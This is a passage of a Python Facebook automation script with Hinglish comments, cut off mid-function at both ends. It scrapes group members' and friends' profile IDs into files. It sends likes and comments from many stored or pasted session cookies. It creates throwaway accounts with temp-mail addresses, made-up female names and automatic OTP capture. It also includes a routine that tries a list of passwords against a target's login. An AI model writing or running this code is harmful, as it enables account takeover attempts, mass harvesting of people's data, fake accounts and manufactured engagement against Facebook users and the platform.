        with open(txt_path, encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                # Sirf ID code wali line (jaise 1764564212).
                if line.isdigit():
                    members.append((line, line, ""))
                    continue
                m = re.match(r"(?:\d+\.\s+)?(.*?)\s+—\s+(\S+)\s+—\s+(\S+)", line)
                if m:
                    members.append((m.group(1), m.group(2), m.group(3)))
        print("MR-ZACKY-group-members.txt se %d members mile." % len(members))
    else:
        for fname in ("members.html", "members.mhtml", "group-members.html"):
            p = os.path.join(BASE, fname)
            if os.path.exists(p):
                members = load_members_file(p)
                print("%s se %d members mile." % (fname, len(members)))
                break
    if not members:
        print("Pehle [5] se members ki list banao — koi list nahi mili.")
        return
    import time
    out_path = os.path.join(BASE, "MR-ZACKY-public-ids.txt")
    public_count = 0
    skipped = 0
    with open(out_path, "w", encoding="utf-8") as f:
        for i, (name, fid, url) in enumerate(members, 1):
            # Profile URL banao: number ho to profile.php, username ho to direct.
            if fid.isdigit():
                profile_url = "https://www.facebook.com/profile.php?id=" + fid
            else:
                profile_url = "https://www.facebook.com/" + fid
            status = check_profile_public(profile_url)
            if status == "public":
                # Numeric ID chahiye: number hai to wohi, username hai to lookup karo.
                if fid.isdigit():
                    fb_id = fid
                else:
                    fb_id = _lookup_via_urllib(fid) or _lookup_via_curl(fid)
                if fb_id:
                    f.write("%s\n" % fb_id)
                    print("[%d/%d] PUBLIC : %s" % (i, len(members), fb_id))
                    public_count += 1
                else:
                    print("[%d/%d] skip (ID nahi mili): %s" % (i, len(members), fid))
                    skipped += 1
            else:
                print("[%d/%d] skip (%s): %s" % (i, len(members), status, fid))
                skipped += 1
            time.sleep(2)
    print("")
    print("Public IDs: %d, skip: %d" % (public_count, skipped))
    print("Public wali list save ho gayi: %s" % out_path)


def _parse_friends_html(html):
    """Friends page ke HTML se doston ke profile links nikalna."""
    out = []
    seen = set()
    skip = {"friends", "watch", "groups", "pages", "marketplace", "gaming",
            "events", "memories", "saved", "notifications", "settings",
            "help", "login", "recover", "about", "privacy", "policies",
            "careers", "lite", "messages", "search", "home", "videos",
            "photos", "reels", "reel", "stories", "live", "fundraisers",
            "jobs", "offers", "weather", "ads", "business", "sharer",
            "dialog", "plugins", "checkpoint", "tr", "ajax"}
    for url, name in re.findall(
        r'<a href="(https://[a-z0-9.-]*facebook\.com/[^"]+)"[^>]*>([^<]+)</a>', html
    ):
        if "/groups/" in url:
            continue
        fid = id_from_url(url)
        if not fid or fid in seen:
            continue
        # Sirf profile links lo — Facebook ke chrome (Friends, Watch...) nahi.
        if not fid.isdigit():
            first = fid.split("/")[0].split("?")[0].lower()
            if first in skip or "/" in fid or first.endswith(".php"):
                continue
        seen.add(fid)
        out.append((name.strip(), fid, url))
    return out


def load_friends_file(path):
    """Friends page ki save ki hui file se doston ke profile links nikalna."""
    with open(path, "rb") as f:
        raw = f.read()
    if path.lower().endswith(".mhtml"):
        import quopri
        raw = quopri.decodestring(raw)
    html = raw.decode("utf-8", errors="ignore")
    return _parse_friends_html(html)


def _fetch_friends_online(who):
    """Login session se mbasic friends page fetch kar ke dost nikalna."""
    m = re.search(r"facebook\.com/([^/?#]+)", who)
    username = m.group(1) if m else who.strip().strip("/")
    if not username or username.lower().startswith("profile.php"):
        print("Username do (jaise Man50or) ya profile link.")
        return []
    html = fb_fetch("https://mbasic.facebook.com/" + username + "/friends")
    if not html:
        print("Friends page nahi khula — session check karo ([8] se login).")
        return []
    if "login.php" in html and "Log in" in html:
        print("Session expire ho gayi — [8] se dobara login karo.")
        return []
    return _parse_friends_html(html)


def _write_friends_ids(friends):
    """Doston ki list se ID-only file likhna + naam wali JSON file.
    Returns kitni IDs likhi. [13] phir in files se bhi check kar sakta hai."""
    import time
    out_path = os.path.join(BASE, "MR-ZACKY-friends-ids.txt")
    json_path = os.path.join(BASE, "public-friends.json")
    total = 0
    resolved = []
    with open(out_path, "w", encoding="utf-8") as f:
        for name, fid, url in friends:
            # List me sirf ID code — naam nahi.
            if fid.isdigit():
                f.write("%s\n" % fid)
                resolved.append((name, fid, url))
                total += 1
            else:
                fb_id = _lookup_via_urllib(fid) or _lookup_via_curl(fid)
                if fb_id:
                    f.write("%s\n" % fb_id)
                    resolved.append((name, fb_id, url))
                    total += 1
                time.sleep(1)
    with open(json_path, "w", encoding="utf-8") as f:
        json.dump({"friends": [{"name": n, "fb_id": i,
                                "profile_link": u} for n, i, u in resolved]},
                  f, ensure_ascii=False, indent=2)
    print("Total doston ki IDs mili: %d" % total)
    print("List save ho gayi: %s" % out_path)
    print("Naam wali list save ho gayi: %s" % json_path)
    print("List me sirf ID code hain (naam nahi) — JSON me naam bhi hain.")
    return total


def load_friends_ids_txt(path):
    """[7] wali MR-ZACKY-friends-ids.txt se IDs parhna (har line ek ID code)."""
    out = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            fid = line.strip()
            if fid.isdigit():
                out.append(("", fid, "https://www.facebook.com/profile.php?id=" + fid))
    return out


def friends_ids():
    print(YELLOW + "=== Public ID ki Friends List se IDs ===" + RESET)
    # 1) Login session ho to seedha fetch karo.
    if load_cookies():
        who = input("Kis public ID ki friends list chahiye? (username ya link, khali = file wala tareeqa): ").strip()
        if who:
            print("Login session se friends list khol raha hun...")
            friends = _fetch_friends_online(who)
            if friends:
                _write_friends_ids(friends)
                return
            print("Seedha fetch se koi dost nahi mila — file wala tareeqa try karta hun.")
    # 2) File wala tareeqa (save ki hui friends.html).
    friends = []
    found = None
    for fname in ("friends.html", "friends.mhtml", "public-friends.html"):
        p = os.path.join(BASE, fname)
        if os.path.exists(p):
            found = fname
            friends = load_friends_file(p)
            print("%s se parha gaya." % fname)
            break
    if not found:
        print("friends.html nahi mili — is liye IDs ki list nahi ban saki.")
        print("")
        print("Tareeqa:")
        print("1. Browser me us public ID ki profile kholo, Friends tab par jao.")
        print("2. Page ko save karo (Chrome: menu > Download / Save page).")
        print("3. File ka naam friends.html rakho aur is folder me daalo.")
        print("4. Phir [7] dabao — IDs ki list ban jayegi: MR-ZACKY-friends-ids.txt")
        print("")
        print("Note: friends list seedha download nahi hoti — Facebook")
        print("friends list bina login ke nahi deta, is liye save ki hui")
        print("file chahiye. Sirf wo dost aayenge jin ki list page par")
        print("load hui ho.")
        print("Login ho to [8] se login karo — phir [7] seedha fetch karega.")
        return
    _write_friends_ids(friends)


def _norm_text(s):
    return " ".join(str(s or "").strip().lower().split())


def _match_my_id_entry(entry, query):
    """my_ids.json ki entry query se milti hai ya nahi."""
    if not isinstance(entry, dict):
        return False
    name = _norm_text(entry.get("name"))
    email = _norm_text(entry.get("email"))
    fid = str(entry.get("fb_id", "") or entry.get("fbId", "") or "").strip()
    link = str(entry.get("profile_link", "") or entry.get("profileLink", "") or "").strip()
    q = _norm_text(query)
    if not q:
        return False
    q_digits = re.sub(r"\D", "", query)
    if q.replace(" ", "").isdigit():
        # Sirf number diya hai — poora ID milna chahiye.
        if q_digits and fid and q_digits == fid:
            return True
        return False
    # Link diya ho to us se ID nikal kar milao.
    q_link_id = id_from_url(query)
    if q_link_id:
        if q_link_id == fid:
            return True
        if q_link_id == id_from_url(link):
            return True
    # Naam ya email se (poora ya hissa).
    if q in name or q in email:
        return True
    if q in _norm_text(link):
        return True
    return False


def _search_my_ids(query):
    """my_ids.json me dhoondo. None = file nahi hai, [] = nahi mili, list = mili."""
    p = os.path.join(BASE, "my_ids.json")
    if not os.path.exists(p):
        return None
    try:
        with open(p, "r", encoding="utf-8") as f:
            data = json.load(f)
    except Exception:
        return []
    entries = data if isinstance(data, list) else data.get("ids", [])
    if not isinstance(entries, list):
        return []
    return [e for e in entries if _match_my_id_entry(e, query)]


def _search_friends(query):
    """friends.json / friends.html me naam ya ID se dhoondo.
    None = file nahi hai, [] = nahi mili, list = mili."""
    friends = None
    if os.path.exists(os.path.join(BASE, "friends.json")):
        try:
            friends = load_json(os.path.join(BASE, "friends.json"))
        except Exception:
            friends = []
    elif os.path.exists(os.path.join(BASE, "friends.html")):
        try:
            friends = load_html(os.path.join(BASE, "friends.html"))
        except Exception:
            friends = []
    if friends is None:
        return None
    q = _norm_text(query)
    q_digits = re.sub(r"\D", "", query or "")
    out = []
    for name, fid, url in friends:
        if q and (q in _norm_text(name) or q == _norm_text(fid)):
            out.append((name, fid, url))
        elif q_digits and fid and q_digits == fid:
            out.append((name, fid, url))
    return out


def _search_id_files(query):
    """Bare ID wali txt files me ID dhoondo. Returns [file names]."""
    q_digits = re.sub(r"\D", "", query or "")
    if not q_digits:
        return []
    hits = []
    for fname in ("MR-ZACKY-friends-ids.txt", "MR-ZACKY-group-members.txt",
                  "MR-ZACKY-public-ids.txt", "MR-ZACKY-ids.txt"):
        p = os.path.join(BASE, fname)
        if not os.path.exists(p):
            continue
        with open(p, encoding="utf-8", errors="ignore") as f:
            for line in f:
                if re.search(r"(?<!\d)" + re.escape(q_digits) + r"(?!\d)", line):
                    hits.append(fname)
                    break
    return hits


def search_lists(query=None):
    print(YELLOW + "=== List mein ID dhoondo ===" + RESET)
    print("Facebook ID code, profile link, email ya naam do — tool")
    print("tumhari apni saved lists mein dhoondhega aur batayega ke")
    print("wo ID kis email par bani thi (agar list mein hai to).")
    print("")
    print("NOTE: Facebook ID se number/Gmail nahi nikalta — ye sirf")
    print("tumhari apni list mein dhoondhta hai. List mein na ho to")
    print("facebook.com/login/identify par masked email/number dekho.")
    print("")
    if query is None:
        query = input("ID / link / email / naam do: ").strip()
    else:
        query = str(query).strip()
    if not query:
        print("Kuch likha nahi.")
        return
    found_any = False
    # 1) my_ids.json — ID se email
    res = _search_my_ids(query)
    if res is None:
        print("")
        print("my_ids.json nahi mili — apni IDs wali list mein nahi")
        print("dhoondh saka. my_ids.json ko is folder me rakho")
        print("(format ke liye my_ids.example.json dekho).")
    elif res:
        found_any = True
        print("")
        print("--- Meri IDs wali list (my_ids.json) mein mili ---")
        for e in res:
            print("Naam   : %s" % (e.get("name") or "-"))
            print("Email  : %s" % (e.get("email") or "-"))
            print("FB ID  : %s" % (e.get("fb_id") or e.get("fbId") or "-"))
            print("Link   : %s" % (e.get("profile_link") or e.get("profileLink") or "-"))
            print("Status : %s" % (e.get("status") or e.get("activation") or "-"))
            if e.get("password"):
                print("Password: %s" % e.get("password"))
            print("")
    # 2) friends.json / friends.html — naam ya ID se dost
    fres = _search_friends(query)
    if fres is None:
        print("friends.json/html nahi mili — doston wali list mein nahi dhoondh saka.")
    elif fres:
        found_any = True
        print("")
        print("--- Doston wali list (friends.json) mein mili ---")
        for name, fid, url in fres[:20]:
            print(" - %s (%s) %s" % (name, fid, url))
        if len(fres) > 20:
            print(" ... aur %d aur" % (len(fres) - 20))
    # 3) Bare ID wali files
    hits = _search_id_files(query)
    if hits:
        found_any = True
        print("")
        print("--- ID wali files mein mili ---")
        for h in hits:
            print(" - %s mein ye ID hai" % h)
    if not found_any:
        print("")
        print("Kisi list mein nahi mili.")
        print("Is ka matlab: ye ID tumhari saved lists mein nahi hai.")
        print("Number/Gmail jan'ne ke liye facebook.com/login/identify")
        print("par ID/link dalo — Facebook masked email/number dikhayega.")


def fb_post(url, fields):
    """Cookie ke saath POST karo — (html, final_url) ya (None, None)."""
    import urllib.error
    cookie = load_cookies()
    if not cookie:
        return None, None
    data = urllib.parse.urlencode(fields).encode("utf-8")
    try:
        req = urllib.request.Request(url, data=data, headers={
            "User-Agent": MOBILE_UA,
            "Cookie": cookie,
            "Content-Type": "application/x-www-form-urlencoded",
        })
        with urllib.request.urlopen(req, timeout=30) as resp:
            return resp.read().decode("utf-8", errors="ignore"), resp.geturl()
    except Exception:
        pass
    import shutil
    import subprocess
    if shutil.which("curl"):
        try:
            args = ["curl", "-sL", "-A", MOBILE_UA, "-H", "Cookie: " + cookie]
            for k, v in fields.items():
                args += ["--data-urlencode", "%s=%s" % (k, v)]
            args += ["-w", "\n%{url_effective}", url]
            out = subprocess.run(args, capture_output=True, timeout=60)
            text = out.stdout.decode("utf-8", errors="ignore")
            if "\n" in text:
                body, final = text.rsplit("\n", 1)
                return body, final.strip()
            return text, url
        except Exception:
            pass
    return None, None


def _abs_mbasic(url):
    """Relative link ko mbasic ka poora link banao."""
    if not url:
        return url
    if url.startswith("http"):
        return url
    if url.startswith("/"):
        return "https://mbasic.facebook.com" + url
    return "https://mbasic.facebook.com/" + url


def _mbasic_post_links(page):
    """Post page se Like link aur comment form nikalo."""
    import html as _html
    like_url = None
    m = re.search(r'<a href="([^"]*like\.php[^"]*)"[^>]*>\s*Like\s*</a>', page or "")
    if m:
        like_url = _html.unescape(m.group(1))
    form = None
    m = re.search(r'<form[^>]*action="([^"]*comment\.php[^"]*)"[^>]*>(.*?)</form>', page or "", re.S)
    if m:
        action = _html.unescape(m.group(1))
        body = m.group(2)
        fields = {}
        for name, value in re.findall(r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"', body):
            fields[name] = _html.unescape(value)
        for name, value in re.findall(r'<input[^>]*name="([^"]+)"[^>]*type="hidden"[^>]*value="([^"]*)"', body):
            fields.setdefault(name, _html.unescape(value))
        cfield = "comment_text"
        cm = re.search(r'<(?:input|textarea)[^>]*name="([^"]*comment[^"]*)"', body)
        if cm:
            cfield = cm.group(1)
        form = (action, fields, cfield)
    return like_url, form


def list_cookie_sessions():
    """Saved cookie sessions: [(label, cookie)].
    fb-cookies.txt (main, [8] se) + fb-cookies-<naam>.txt files."""
    sessions = []
    main = load_cookies()
    if main:
        sessions.append(("main", main))
    import glob
    for p in sorted(glob.glob(os.path.join(BASE, "fb-cookies-*.txt"))):
        try:
            with open(p, encoding="utf-8", errors="ignore") as f:
                c = f.read().strip()
            if c:
                label = os.path.basename(p)[len("fb-cookies-"):-len(".txt")]
                sessions.append((label, c))
        except Exception:
            pass
    return sessions


def like_one_post(cookie, post_link):
    """Ek session se post ko like karo.
    Returns (status, detail): 'ok' | 'already' | 'expired' |
    'checkpoint' | 'no_button' | 'error'."""
    page, _ = fb_fetch_full_cookie(cookie, post_link)
    if not page:
        return "error", "post nahi khula"
    if "login.php" in page and "Log in" in page:
        return "expired", "session expire ho gayi"
    if "checkpoint" in page.lower():
        return "checkpoint", "Facebook ne checkpoint manga"
    like_url, _form = _mbasic_post_links(page)
    if not like_url:
        if "Unlike" in page:
            return "already", "pehle se liked hai"
        return "no_button", "Like button nahi mila (post public nahi ya pehle se liked)"
    fb_fetch_full_cookie(cookie, _abs_mbasic(like_url))
    page2, _ = fb_fetch_full_cookie(cookie, post_link)
    if page2 and "Unlike" in page2:
        return "ok", "like lag gaya"
    return "ok", "bhej diya — post khol kar confirm kar lo"


def parse_youtube_views(html):
    """YouTube watch page HTML se (title, views) nikalo — views na mile to None."""
    title = None
    m = re.search(r"<title>([^<]+)</title>", html or "")
    if m:
        title = m.group(1).strip()
    views = None
    for pat in (r'"viewCount":"?(\d+)"?',
                r'"simpleText":"([\d,]+) views"',
                r'([\d,]+) views</'):
        m = re.search(pat, html or "")
        if m:
            views = m.group(1).replace(",", "")
            break
    return title, views


def parse_fb_likes(html):
    """mbasic post page se (likes, already_liked) nikalo — likes na mile to None."""
    if not html:
        return None, False
    already = "Unlike" in html
    for pat in (r'([\d,]+)\s+people like this',
                r'([\d,]+)\s+likes?',
                r'Like[^<]*?([\d,]+)'):
        m = re.search(pat, html, re.IGNORECASE)
        if m:
            return m.group(1).replace(",", ""), already
    return None, already


TEMP_MAIL_BASE = "https://yandex-temp-mail-server.onrender.com"

USA_FIRST_F = ["Ava", "Mia", "Harper", "Ella", "Grace", "Lily",
               "Emily", "Sophia", "Emma", "Olivia", "Charlotte", "Amelia"]
USA_LAST = ["Thompson", "Johnson", "Davis", "Wilson", "Anderson",
            "Thomas", "Carter", "Bennett", "Koll", "Smith", "Brown", "Taylor"]


def temp_mail_alias(provider):
    """Temp Mail server se naya email lo — (address, tag) ya (None, None).
    Alias 60 minute ke liye hota hai."""
    import json as _json
    import urllib.request
    try:
        req = urllib.request.Request(
            TEMP_MAIL_BASE + "/api/alias",
            data=_json.dumps({"provider": provider}).encode(),
            headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=60) as resp:
            d = _json.loads(resp.read().decode("utf-8", errors="ignore"))
        return d.get("address"), d.get("tag")
    except Exception:
        return None, None


def temp_mail_otp(tag, provider, wait_sec=180):
    """Tag ke inbox mein Facebook OTP dhoondo — poll karke (code, subject)
    do, na mile to (None, None). Server mail se OTP khud nikalta hai."""
    import json as _json
    import time as _time
    import urllib.request
    import urllib.parse
    end = _time.time() + wait_sec
    while _time.time() < end:
        try:
            req = urllib.request.Request(
                TEMP_MAIL_BASE + "/api/sync",
                data=_json.dumps({"tag": tag, "provider": provider}).encode(),
                headers={"Content-Type": "application/json"})
            with urllib.request.urlopen(req, timeout=60) as resp:
                _json.loads(resp.read().decode("utf-8", errors="ignore"))
        except Exception:
            pass
        try:
            url = TEMP_MAIL_BASE + "/api/messages/" + urllib.parse.quote(tag) + "?provider=" + provider
            with urllib.request.urlopen(url, timeout=30) as resp:
                d = _json.loads(resp.read().decode("utf-8", errors="ignore"))
            for msg in d.get("messages", []):
                otp = msg.get("otp")
                frm = (msg.get("from") or "").lower()
                subj = (msg.get("subject") or "").lower()
                if otp and ("facebook" in frm or "facebook" in subj or "registration" in frm):
                    return otp, msg.get("subject")
        except Exception:
            pass
        _time.sleep(15)
    return None, None


def create_facebook_id():
    """[16] Facebook ID banao — Temp Mail email + OTP watch.
    Facebook ka signup form script se nahi bharta (JS/Bloks flow),
    is liye signup tumhare phone ke browser mein hota hai — tool
    email banata hai aur OTP khud nikal kar deta hai."""
    print(YELLOW + "=== Facebook ID Banao (Temp Mail + OTP) ===" + RESET)
    print("Facebook ka signup form script se nahi bharta — is liye")
    print("signup tumhare phone ke browser mein hoga. Tool email")
    print("banayega aur OTP khud nikal kar dega.")
    print("")
    mode = input("1 = Nayi ID banao | 2 = Sirf OTP dekho (pehle se signup kiya hai): ").strip()
    if mode == "2":
        tag = input("Temp Mail tag do (email ke + ke baad wala hissa, jaise 7i1zdh): ").strip().lower()
        provider = input("Provider (gmail/yandex, default gmail): ").strip().lower() or "gmail"
        if not tag:
            print("Tag khali hai.")
            return
        print("OTP ka intezar hai (3 minute tak)...")
        otp, subj = temp_mail_otp(tag, provider)
        if otp:
            print("OTP mil gaya: %s (%s)" % (otp, subj or ""))
        else:
            print("3 minute mein koi Facebook OTP nahi aaya — Temp Mail site par inbox dekh lo.")
        return
    provider = input("Email provider (gmail/yandex, default gmail): ").strip().lower() or "gmail"
    if provider not in ("gmail", "yandex"):
        provider = "gmail"
    print("Temp Mail se email bana raha hun...")
    address, tag = temp_mail_alias(provider)
    if not address:
        print("Temp Mail server se email nahi bana — server so raha ho to dobara try karo.")
        return
    import random
    first = random.choice(USA_FIRST_F)
    last = random.choice(USA_LAST)
    name = input("Naam (default %s %s): " % (first, last)).strip() or (first + " " + last)
    dob = input("Date of birth (default 14/08/2000): ").strip() or "14/08/2000"
    import getpass
    pw = getpass.getpass("Password (ye save NAHI hoga): ").strip()
    if not pw:
        print("Password khali hai.")
        return
    print("")
    print("=== Signup details (email 60 minute ke liye hai — jaldi karo) ===")
    print("Email: %s" % address)
    print("Naam: %s" % name)
    print("DOB: %s (Female)" % dob)
    print("Password: %s" % pw)
    print("")
    print("Ab apne phone ke browser mein facebook.com kholo aur")
    print("Create Account dabao — yehi email, naam, DOB aur password")
    print("use karo. Facebook code bhejega — main OTP ka intezar karta hun.")
    print("OTP ka intezar hai (3 minute tak)...")
    otp, subj = temp_mail_otp(tag, provider)
    if otp:
        print("OTP mil gaya: %s" % otp)
        print("Ye code Facebook mein daalo — ID ban jayegi.")
        print("ID banne ke baad us ka link + email list mein likh lena.")
    else:
        print("3 minute mein koi Facebook OTP nahi aaya.")
        print("Agar code aaya hai to Temp Mail site par dekh lo, ya [16] > 2 se dobara dekho.")

def check_post_counts(link=None):
    """[15] Post ke likes + YouTube video ke views check karo — ASLI ginti.
    Ye kuch bhejta nahi, sirf dikhata hai ke post/video par abhi
    kitne likes/views hain — ta ke pata chale ke like/view pahuncha ya nahi."""
    print(YELLOW + "=== Post ke Likes / Video ke Views Check Karo ===" + RESET)
    print("Ye sirf ginti dikhata hai — kuch bhejta nahi. Like bhejne ke")
    print("liye [14] hai (apni logged-in IDs se), views YouTube sirf")
    print("asli dekhne par ginta hai.")
    print("")
    if not link:
        link = input("Post ya video ka link do: ").strip()
    if not link:
        print("Link khali hai.")
        return
    if "youtube.com" in link or "youtu.be" in link:
        print("YouTube video khol raha hun...")
        try:
            import urllib.request
            req = urllib.request.Request(
                link, headers={"User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36"})
            with urllib.request.urlopen(req, timeout=30) as resp:
                html = resp.read().decode("utf-8", errors="ignore")
        except Exception as e:
            print("Video nahi khuli: %s" % e)
            return
        title, views = parse_youtube_views(html)
        if title:
            print("Video: %s" % title)
        if views:
            print("Views: %s" % views)
        else:
            print("Views nahi mile — video private ho sakti hai ya YouTube ne page nahi diya.")
        return
    if "facebook.com" in link:
        if "mbasic.facebook.com" not in link:
            link = re.sub(r"https?://(?:www\.|m\.)?facebook\.com", "https://mbasic.facebook.com", link)
        page = fb_fetch(link)
        if not page:
            print("Post nahi khula — [8] se pehle login karo.")
            return
        if "login.php" in page and "Log in" in page:
            print("Session expire ho gayi — [8] se dobara login karo.")
            return
        likes, already = parse_fb_likes(page)
        if likes:
            print("Likes: %s" % likes)
        else:
            print("Likes ki ginti page par nahi mili.")
        if already:
            print("Tumhari is ID ne is post ko pehle se like kiya hua hai.")
        return
    print("Link Facebook post ya YouTube video ka hona chahiye.")

def send_likes_multi(post_link=None, want=10):
    """[14] Post par kai IDs se likes bhejo — har session se ek like.
    Har like tumhari ek logged-in ID se aata hai — 'farzi' ginti nahi
    ban sakti, har like ke peeche ek asli login hota hai. Facebook
    automated likes ko block bhi kar sakta hai (Sai wale kaam mein
    yehi hua tha), is liye har like ke beech 5 second ka waqfa hai."""
    print(YELLOW + "=== Post par Likes Bhejo (kai IDs se) ===" + RESET)
    print("Har like tumhari ek logged-in ID se aata hai — ek ID ek post")
    print("ko ek hi dafa like kar sakti hai. 10 likes ke liye 10 IDs ki")
    print("cookies chahiye hongi. Facebook automated likes ko block bhi")
    print("kar sakta hai — is liye har like ke beech 5 second ka waqfa hai.")
    print("")
    if not post_link:
        post_link = input("Post ka link do: ").strip()
    if not post_link:
        print("Link khali hai.")
        return
    if "facebook.com" in post_link and "mbasic.facebook.com" not in post_link:
        post_link = re.sub(r"https?://(?:www\.|m\.)?facebook\.com", "https://mbasic.facebook.com", post_link)
    if want == 10:
        try:
            want = int(input("Kitne likes chahiye? (default 10): ").strip() or "10")
        except ValueError:
            want = 10
    sessions = list_cookie_sessions()
    if not sessions:
        print("Koi login session nahi hai — [8] se pehle login karo, ya neeche cookie paste karo.")
    extra = input("Koi ID ki cookie paste karni hai? (paste karo, ya Enter dabao): ").strip()
    if extra:
        name, _link = fb_whoami_cookie(extra)
        if name:
            sessions.append(("pasted-" + name, extra))
            print("Cookie se login ho gaya: %s" % name)
        else:
            print("Ye cookie kaam nahi kar rahi (expire ya ghalat) — saved sessions se kaam chalega.")
    if not sessions:
        print("Aur IDs ki cookies aise daalo: [8] se ek ID login karo, phir")
        print("Termux mein: cp fb-cookies.txt fb-cookies-<naam>.txt")
        print("Phir agli ID [8] se login karo aur dobara copy karo.")
        return
    print("Sessions mili: %d (chahiye: %d likes)" % (len(sessions), want))
    done = 0
    import time
    for label, cookie in sessions:
        if done >= want:
            break
        name, _link = fb_whoami_cookie(cookie)
        who = name or label
        print("--- %s ---" % who)
        status, detail = like_one_post(cookie, post_link)
        if status == "ok":
            done += 1
            print("Like lag gaya! (%d/%d)" % (done, want))
        elif status == "already":
            print("Pehle se liked hai — naya like nahi gina.")
        else:
            print("Nahi hua: %s" % detail)
        if done < want:
            time.sleep(5)
    print("")
    print("Total likes bheje: %d (chahiye the %d)" % (done, want))
    if done < want:
        print("Aur IDs ki cookies chahiye — [8] se login karo aur")
        print("cp fb-cookies.txt fb-cookies-<naam>.txt se save karo.")

def like_comment(mode=None, post_link=None):
    print(YELLOW + "=== Post par Like / Comment ===" + RESET)
    if not load_cookies():
        print("Pehle [8] se Facebook login karo — bina login ke like/comment nahi hota.")
        return
    who_name, who_link = fb_whoami()
    if not who_name:
        print("Login session check nahi hua — [8] se dobara login karo.")
        return
    print("Logged in: %s" % who_name)
    print("")
    print("WARNING: Facebook automated like/comment ko block kar sakta hai.")
    print("Ek dafa me sirf ek action karo — tezi se karo ge to is ID par")
    print("restriction lag sakti hai (Sai wale kaam mein yehi hua tha).")
    print("")
    if mode not in ("like", "comment"):
        print("1. Like bhejo")
        print("2. Comment likho")
        print("0. Wapas")
        c = input("Option chunno: ").strip()
        if c == "1":
            mode = "like"
        elif c == "2":
            mode = "comment"
        else:
            return
    if not post_link:
        post_link = input("Post ka link do: ").strip()
    if not post_link:
        print("Link khali hai.")
        return
    if "facebook.com" in post_link and "mbasic.facebook.com" not in post_link:
        post_link = re.sub(r"https?://(?:www\.|m\.)?facebook\.com", "https://mbasic.facebook.com", post_link)
    text = ""
    if mode == "comment":
        text = input("Comment kya likhna hai? ").strip()
        if not text:
            print("Comment khali hai.")
            return
    print("Post khol raha hun...")
    page = fb_fetch(post_link)
    if not page or ("login.php" in page and "Log in" in page):
        print("Post nahi khula — session expire ho sakti hai, [8] se dobara login karo.")
        return
    if "checkpoint" in page.lower():
        print("Facebook ne CHECKPOINT manga hai — browser me khud karo, phir dobara try karo.")
        return
    like_url, form = _mbasic_post_links(page)
    if mode == "like":
        if not like_url:
            print("Is post par Like ka button nahi mila — shayad pehle se liked hai, ya post public nahi.")
            return
        print("Like bhej raha hun...")
        fb_fetch(_abs_mbasic(like_url))
        page2 = fb_fetch(post_link)
        if page2 and "Unlike" in page2:
            print("Like lag gaya!")
        else:
            print("Like bhej diya — confirm karne ke liye post khol kar dekho (Unlike likha ho to lag gaya).")
    else:
        if not form:
            print("Is post par comment form nahi mila — shayad comments band hain.")
            return
        action, fields, cfield = form
        fields[cfield] = text
        print("Comment bhej raha hun...")
        fb_post(_abs_mbasic(action), fields)
        page2 = fb_fetch(post_link)
        if page2 and text[:30] in page2:
            print("Comment lag gaya!")
        else:
            print("Comment bhej diya — confirm karne ke liye post khol kar dekho.")


def _login_id_from_code(query):
    """Link/code se login karne wala identifier nikalo.
    Returns (identifier, kind): kind 'email' | 'username' | 'number' | None.
    Username se login hota hai; number (ID code) se aksar nahi hota."""
    q = (query or "").strip()
    if not q:
        return None, None
    if "@" in q:
        return q, "email"
    m = re.search(r"(?:facebook\.com|fb\.com)/profile\.php\?id=(\d+)", q)
    if m:
        return m.group(1), "number"
    m = re.search(r"(?:facebook\.com|fb\.com)/([A-Za-z0-9._-]+)", q)
    if m and m.group(1).lower() != "profile.php":
        return m.group(1), "username"
    if q.isdigit():
        return q, "number"
    if re.match(r"^[A-Za-z0-9._-]+$", q):
        return q, "username"
    return None, None


def _try_passwords(identifier, passwords):
    """Password list ko ek identifier par try karo.
    Returns (result, password): result 'ok'|'no_account'|'checkpoint'|'locked'|'error'|'nomatch'."""
    for i, pw in enumerate(passwords, 1):
        print("Password %d try kar raha hun..." % i)
        status, _cookie = _mbasic_login_attempt(identifier, pw)
        if status == "ok":
            return "ok", pw
        if status == "checkpoint":
            return "checkpoint", None
        if status == "locked":
            return "locked", None
        if status == "error":
            return "error", None
        if status == "no_account":
            return "no_account", None
        print("Password %d ghalat hai." % i)
    return "nomatch", None


def _print_check_ok(code, pw):
    print("")
    print("OK — %s" % code)
    print("Ye theek hai, is par log in kar lo.")
    print("Password: %s" % pw)
    print("Session save NAHI ki — login tum khud karo ge (cookie ya browser se).")


def add_password_to_list():
    """[12] Apni ID ka password my_ids.json mein likho.
    Password sirf is phone ki file mein save hota hai — GitHub par kabhi nahi jata."""
    print(YELLOW + "=== Password List Mein Likho (apni ID ke liye) ===" + RESET)
    print("Sirf APNI ID ke liye — password sirf tumhare phone ki file mein save hoga,")
    print("GitHub par kabhi nahi jayega.")
    print("")
    query = input("ID ka link / code / email do: ").strip()
    if not query:
        print("Kuch nahi diya.")
        return
    p = os.path.join(BASE, "my_ids.json")
    entries = []
    if os.path.exists(p):
        try:
            with open(p, "r", encoding="utf-8") as f:
                data = json.load(f)
            entries = data if isinstance(data, list) else data.get("ids", [])
        except Exception:
            print("my_ids.json kharab hai — pehle [9] se check kar lo.")
            return
    found = None
    for e in entries:
        if isinstance(e, dict) and _match_my_id_entry(e, query):
            found = e
            break
    if found:
        print("ID mili: %s — %s" % (found.get("name") or "-", found.get("email") or "email nahi"))
        if found.get("password"):
            print("Is ID ka password pehle se likha hai.")
            ans = input("Badalna hai? (haan likho, warna khaali Enter): ").strip().lower()
            if ans not in ("haan", "ha", "yes", "y"):
                print("Kuch nahi badla.")
                return
    else:
        print("Ye ID list mein nahi hai — nayi entry banata hun.")
        found = {}
        identifier, kind = _login_id_from_code(query)
        if kind == "number":
            found["fb_id"] = identifier
            found["profile_link"] = "https://www.facebook.com/profile.php?id=" + identifier
        elif kind == "username":
            found["profile_link"] = "https://www.facebook.com/" + identifier
        elif kind == "email":
            found["email"] = identifier
        name = input("Is ID ka naam likho (khaali bhi chhod sakte ho): ").strip()
        if name:
            found["name"] = name
        if not found.get("email"):
            email = input("Is ID ka email likho: ").strip()
            if email:
                found["email"] = email
        found.setdefault("status", "Active")
        entries.append(found)
    import getpass
    pw = getpass.getpass("Password likho (screen par nahi dikhega): ")
    if not pw:
        print("Password khaali hai — kuch save nahi kiya.")
        return
    pw2 = getpass.getpass("Password dobara likho (confirm karo): ")
    if pw2 != pw:
